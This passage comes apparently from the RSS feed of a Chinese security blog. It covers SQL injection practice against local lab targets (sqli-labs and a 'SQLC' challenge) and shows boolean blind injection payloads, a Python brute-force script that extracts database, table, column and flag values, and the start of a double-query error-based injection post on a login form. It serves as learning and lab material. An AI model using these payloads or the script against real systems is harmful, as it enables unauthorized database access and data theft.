&lt;h4 id=&#34;设置爆破变量&#34;&gt;&lt;a href=&#34;#设置爆破变量&#34; class=&#34;headerlink&#34; title=&#34;设置爆破变量&#34;&gt;&lt;/a&gt;设置爆破变量&lt;/h4&gt;&lt;p&gt;首先我们确定好&lt;/p&gt;
&lt;p&gt; ascii(substr(database(),&lt;code&gt;1&lt;/code&gt;,1))=&lt;code&gt;1&lt;/code&gt; —+ 这一句中，我标识出来的两个位置【需要我们使用工具&lt;strong&gt;爆破&lt;/strong&gt;】。&lt;/p&gt;
&lt;p&gt;使用Add$ 来为想要爆破的变量添加上变量符号&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001011541978.png&#34; alt=&#34;image-20221001011541978&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;选择爆破取值范围&#34;&gt;&lt;a href=&#34;#选择爆破取值范围&#34; class=&#34;headerlink&#34; title=&#34;选择爆破取值范围&#34;&gt;&lt;/a&gt;选择爆破取值范围&lt;/h4&gt;&lt;p&gt;第一个位置， ascii(substr(database(),&lt;code&gt;1&lt;/code&gt;,1))=1&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001011859324.png&#34; alt=&#34;image-20221001011859324&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二个位置， ascii(substr(database(),1,1))=&lt;code&gt;1&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001012047075.png&#34; alt=&#34;image-20221001012047075&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;开始爆破&#34;&gt;&lt;a href=&#34;#开始爆破&#34; class=&#34;headerlink&#34; title=&#34;开始爆破&#34;&gt;&lt;/a&gt;开始爆破&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;image-20221001012115998.png&#34; alt=&#34;image-20221001012115998&#34;&gt;&lt;/p&gt;
&lt;p&gt;由于我们的包总长度&lt;code&gt;根据回显内容不同而发生变化&lt;/code&gt;，因此，只有&lt;strong&gt;当取值正确的时候包长度会跟其他错误的情况不一样&lt;/strong&gt;，看下图有8个情况和其他次数有不一样的结果。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001012215106.png&#34; alt=&#34;image-20221001012215106&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;table-container&#34;&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;payload1(数据库名第n个字符)&lt;/th&gt;
&lt;th&gt;payload2(数据库名第n个字符是什么字符)&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;1&lt;/td&gt;
&lt;td&gt;115—&amp;gt;’s’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;2&lt;/td&gt;
&lt;td&gt;101—&amp;gt;’e’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;td&gt;99  —&amp;gt;’c’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;4&lt;/td&gt;
&lt;td&gt;117—&amp;gt;’u’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;5&lt;/td&gt;
&lt;td&gt;114—&amp;gt;’r’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;td&gt;105—&amp;gt;’i’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;7&lt;/td&gt;
&lt;td&gt;116—&amp;gt;’t’&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;8&lt;/td&gt;
&lt;td&gt;121—&amp;gt;’y’&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;/div&gt;
&lt;p&gt;综上，数据库名是&lt;code&gt;security&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;爆破表名，同理&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/sqli/Less-8/?id=1&amp;#x27;and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=1 --+&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;小练习：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;#尝试报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;①http://127.0.0.1/SQLC/sql-3.php/?id=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;②http://127.0.0.1/SQLC/sql-3.php/?id=1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;传入的值:id=1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SELECT * FROM users WHERE id=(1) LIMIT 0,1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: Kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id=1&amp;#x27;查询失败&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#闭合符号，尝试不报错&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;传入的值:id=1) #&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SELECT * FROM users WHERE id=(1) #) LIMIT 0,1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: Kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#布尔盲注&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#1.构造布尔值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and 1 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Username: kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Password: Kevin&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#2.Burp爆破数据库长度&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and length(database())=9 %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#3.Burp爆破数据库名字&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr(database(),1,1))=20) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1-99&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2-104&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3-97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4-108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5-108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6-101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7-110&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8-103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9-101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;database()=challenge&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#4.爆破表名&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=20) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1-101&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2-109&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3-97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4-105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5-108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6-115&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;第一个表名emails&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&amp;#x27;%s&amp;#x27;)) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=20) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1-102&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2-108&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3-97&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4-103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;第二个表名flag&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#5.爆破表中的列&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and tabel_name=&amp;#x27;flag&amp;#x27; limit 1,1),1,1))=20) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;爆破脚本&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and tabel_name=&amp;#x27;flag&amp;#x27; limit 0,1),%d,1))=ord(&amp;#x27;%s&amp;#x27;)) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;#6.爆破值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select value from challeng.flag where flag=&amp;#x27;flag3&amp;#x27; limit 1,1),1,1))=20) %23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;1-103&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2-105&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3-114&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;gir&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;【附】爆破脚本&#34;&gt;&lt;a href=&#34;#【附】爆破脚本&#34; class=&#34;headerlink&#34; title=&#34;【附】爆破脚本&#34;&gt;&lt;/a&gt;【附】爆破脚本&lt;/h5&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;target_name&lt;/span&gt;():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	name = &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; j &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;range&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;10&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; i &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&amp;#x27;&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&amp;#x27;%s&amp;#x27;))&amp;quot;&lt;/span&gt; %(j,i)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(url+&lt;span class=&#34;string&#34;&gt;&amp;#x27;%23&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			r = requests.get(url+&lt;span class=&#34;string&#34;&gt;&amp;#x27;%23&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;#x27;Username: kevin&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;in&lt;/span&gt; r.text:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				name = name+i&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;				&lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;FINAL target_name:&amp;#x27;&lt;/span&gt;,name)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;target_name()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h5 id=&#34;脚本爆破数据库名&#34;&gt;&lt;a href=&#34;#脚本爆破数据库名&#34; class=&#34;headerlink&#34; title=&#34;脚本爆破数据库名&#34;&gt;&lt;/a&gt;脚本爆破数据库名&lt;/h5&gt;&lt;p&gt;url为：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr(database(),%d,1))=ord(&amp;#x27;%s&amp;#x27;))&amp;quot;&lt;/span&gt; %(j,i)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001120214845.png&#34; alt=&#34;image-20221001120214845&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;脚本爆破表名&#34;&gt;&lt;a href=&#34;#脚本爆破表名&#34; class=&#34;headerlink&#34; title=&#34;脚本爆破表名&#34;&gt;&lt;/a&gt;脚本爆破表名&lt;/h5&gt;&lt;p&gt;修改url为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;url = &amp;quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),%d,1))=ord(&amp;#x27;%s&amp;#x27;))&amp;quot; %(j,i)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆出第一个表名&lt;code&gt;emails&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001115314470.png&#34; alt=&#34;image-20221001115314470&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改&lt;code&gt;limit 1,1&lt;/code&gt;爆出第二个表名&lt;code&gt;flag&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001115353280.png&#34; alt=&#34;image-20221001115353280&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;脚本爆破列名&#34;&gt;&lt;a href=&#34;#脚本爆破列名&#34; class=&#34;headerlink&#34; title=&#34;脚本爆破列名&#34;&gt;&lt;/a&gt;脚本爆破列名&lt;/h5&gt;&lt;p&gt;修改url为：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&amp;#x27;flag&amp;#x27; limit 0,1),%d,1))=ord(&amp;#x27;%s&amp;#x27;))&amp;quot;&lt;/span&gt; %(j,i)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆出第一个列名&lt;code&gt;flag&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001114442930.png&#34; alt=&#34;image-20221001114442930&#34;&gt;&lt;/p&gt;
&lt;p&gt;修改&lt;code&gt;limit 1,1&lt;/code&gt;爆出第二个列名&lt;code&gt;value&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001114318316.png&#34; alt=&#34;image-20221001114318316&#34;&gt;&lt;/p&gt;
&lt;h5 id=&#34;脚本爆破值&#34;&gt;&lt;a href=&#34;#脚本爆破值&#34; class=&#34;headerlink&#34; title=&#34;脚本爆破值&#34;&gt;&lt;/a&gt;脚本爆破值&lt;/h5&gt;&lt;p&gt;修改url为：&lt;/p&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;url = &lt;span class=&#34;string&#34;&gt;&amp;quot;http://127.0.0.1/SQLC/sql-3.php/?id=1) and (ascii(substr((select value from challenge.flag where flag=&amp;#x27;flag3&amp;#x27;),%d,1))=ord(&amp;#x27;%s&amp;#x27;))&amp;quot;&lt;/span&gt; %(j,i)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;爆出当&lt;code&gt;flag=flag3&lt;/code&gt;时的&lt;code&gt;value&lt;/code&gt;值为&lt;code&gt;gir&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20221001115921853.png&#34; alt=&#34;image-20221001115921853&#34;&gt;&lt;/p&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/</guid>
            <title>双注入</title>
            <link>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/</link>
            <category>SQL注入探究</category>
            <pubDate>Sat, 01 Oct 2022 00:08:18 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;SQL-注入之双注入&#34;&gt;&lt;a href=&#34;#SQL-注入之双注入&#34; class=&#34;headerlink&#34; title=&#34;SQL 注入之双注入&#34;&gt;&lt;/a&gt;SQL 注入之双注入&lt;/h1&gt;&lt;p&gt;本篇使用双注入。&lt;/p&gt;
&lt;h2 id=&#34;注入步骤&#34;&gt;&lt;a href=&#34;#注入步骤&#34; class=&#34;headerlink&#34; title=&#34;注入步骤&#34;&gt;&lt;/a&gt;注入步骤&lt;/h2&gt;&lt;h3 id=&#34;设置代理&#34;&gt;&lt;a href=&#34;#设置代理&#34; class=&#34;headerlink&#34; title=&#34;设置代理&#34;&gt;&lt;/a&gt;设置代理&lt;/h3&gt;&lt;p&gt;还是Less-11，我们挂上&lt;strong&gt;BurpSuit&lt;/strong&gt;代理，然后&lt;strong&gt;Send To Reapeater&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930220638714.png&#34; alt=&#34;image-20220930220638714&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;确定注入类型和列数&#34;&gt;&lt;a href=&#34;#确定注入类型和列数&#34; class=&#34;headerlink&#34; title=&#34;确定注入类型和列数&#34;&gt;&lt;/a&gt;确定注入类型和列数&lt;/h3&gt;&lt;p&gt;我们输入1 + 单引号。 &lt;strong&gt;不报错&lt;/strong&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930221056886.png&#34; alt=&#34;image-20220930221056886&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入1 + 单引号 + %23&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27;&amp;quot; %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;报错，&lt;code&gt;&amp;quot; #&amp;#39; and password=&amp;#39;123456&amp;#39; LIMIT 0,1&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;由#号后面跟着个单引号，这就说明第一个&lt;strong&gt;username是使用单引号闭合的&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930221013645.png&#34; alt=&#34;image-20220930221013645&#34;&gt;&lt;/p&gt;
&lt;p&gt;使用order by n确定列数&lt;/p&gt;
&lt;p&gt;输入2，不报错&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; order by 2 %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930221434509.png&#34; alt=&#34;image-20220930221434509&#34;&gt;&lt;/p&gt;
&lt;p&gt;输入3，报错&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; order by 3 %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img src=&#34;image-20220930221557671.png&#34; alt=&#34;image-20220930221557671&#34;&gt;&lt;/p&gt;
&lt;p&gt;综上，注入类型是&lt;strong&gt;POST型单引号注入&lt;/strong&gt;，且&lt;strong&gt;查询列数为2&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;采用双注入时，我们需要使用到以下函数：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;group by 函数：在对数据进行分组时会先看虚拟表中是否存在这个值，不存在就插入；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;floor()函数：MySQL的一个数学函数。此函数用于查找等于或小于给定数字的最大整数。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Select floor(11.2); ----&amp;gt;返回11（注意，只返回11，因为11是小于11.2的最大整数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+----------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   floor(11.2)  |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+----------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|           11   |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+----------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rand()函数：获取随机的浮点数（小于0的小数），而 rand(0) 则是获取固定的小数值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;举例说明：select rand() from qs_ad_category;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;结果为随机的浮点型小数：0.7450851357961866&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;floor() 函数 配合 rand() 函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;由于rand()函数是获取小于1 的浮点数，也就是例如上述结果中的0.7450851357961866&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;而floor()函数是将括号中的值取整，以小于括号中值的最大整数作为结果展示出来。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;例如上述rand()的结果为 0.7450851357961866，那么最大整数就是 “0” 所以 ：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select floor(rand(0)) from qs_ad_category 的 结果值 为 “0” 。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;若是rand()*2,则 rand() 结果可能会大于 1 ，那么结合 floor()函数 ——最终的值可能为0，可能为1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count() 函数：计数函数，用来计算数据总和的函数，该函数结果集只有一个。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count(1)：统计不为NULL 的记录。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count(*)：统计所有的记录（包括NULL）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count(字段)：统计该&amp;quot;字段&amp;quot;不为NULL 的记录。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count(DISTINCT 字段)：统计该&amp;quot;字段&amp;quot;去重且不为NULL 的记录。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果三者一起使用:&lt;/span&gt;&lt;br&gt;&lt;span 